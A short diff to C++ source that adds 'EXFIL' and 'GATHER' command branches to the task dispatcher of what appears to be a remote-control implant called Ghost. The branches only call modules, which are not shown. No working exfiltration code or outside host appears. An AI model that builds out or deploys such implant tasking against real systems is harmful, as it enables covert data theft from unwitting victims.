@@ -253,6 +253,20 @@ void Ghost::processTask(const json& task) {
         status = TaskStatus::Done;
     }
     #endif
+    #ifdef FEATURE_EXFIL
+    else if (command == "EXFIL") {
+        bool success = modules["EXFIL"]->execute(args);
+        output = success ? "Exfil completed successfully" : "Exfil failed";
+        status = success ? TaskStatus::Done : TaskStatus::Failed;
+    }
+    #endif
+    #ifdef FEATURE_GATHERING
+    else if (command == "GATHER") {
+        bool success = modules["GATHER"]->execute(args);
+        output = success ? "Gathering completed successfully" : "Gathering failed";
+        status = success ? TaskStatus::Done : TaskStatus::Failed;
+    }
+    #endif
     else {
         output = "Unknown command";
         status = TaskStatus::Failed;
